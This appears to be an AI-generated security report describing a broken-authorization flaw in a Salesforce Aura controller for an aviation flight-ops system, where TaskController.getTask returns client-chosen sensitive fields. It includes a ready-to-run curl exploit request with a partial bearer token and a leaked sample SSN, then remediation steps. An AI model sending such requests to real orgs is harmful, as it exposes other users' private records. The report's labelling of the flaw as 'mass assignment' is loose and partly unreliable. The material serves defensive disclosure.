# Security Analysis Report
**System:** AeroOps Flight Management (Aviation / Flight Ops) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0037 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.12 | Mass assignment via object fields — `TaskController.getTask` returns client-specified fields without ownership check on flight ops records |

---

## Finding 1 — Mass Assignment: Client-Controlled Fields in Aviation Flight Task (CRITICAL)

### Summary
The `TaskController` Apex class on AeroOps Flight Management (`e24eab0b.lightning.force.com`) is declared `without sharing`. Per §5.0 Pattern 1.12, the `getTask` action is vulnerable to mass assignment via client-controlled `fields` array: attacker requests `taskId: "001AB0B"` with `["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]` to access flight operations task data and harvest sensitive fields beyond what the function normally requires. In aviation, task records contain maintenance instructions, crew assignments, and safety-critical operational data.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://e24eab0b.lightning.force.com/aura`

### Evidence from HAR
**Request:** `taskId: 001AB0B`, `fields: ["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]`
**Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-13-2632`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class | OWD bypassed |
| §5.0 Pattern 1.12 | Mass assignment | Classification | Client-controlled fields |
| HAR descriptor | `c.TaskController.getTask` | Entry point | |
| HAR params | `taskId` | `001AB0B` | Victim flight task |
| HAR params | `fields` | Full sensitive list | Client harvests sensitive fields |
| HAR response | `SensitiveData__c` | `SSN: 000-13-2632` | Crew/maintenance PII |

### Steps to Reproduce
```bash
curl -s -X POST "https://e24eab0b.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DE24EAB0B!ARe24eab0b..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001AB0B","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class TaskController {`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist for task function.
4. Validate `aura.token`.
5. Aviation: flight task records are safety-critical — EASA/FAA access control requirements apply.
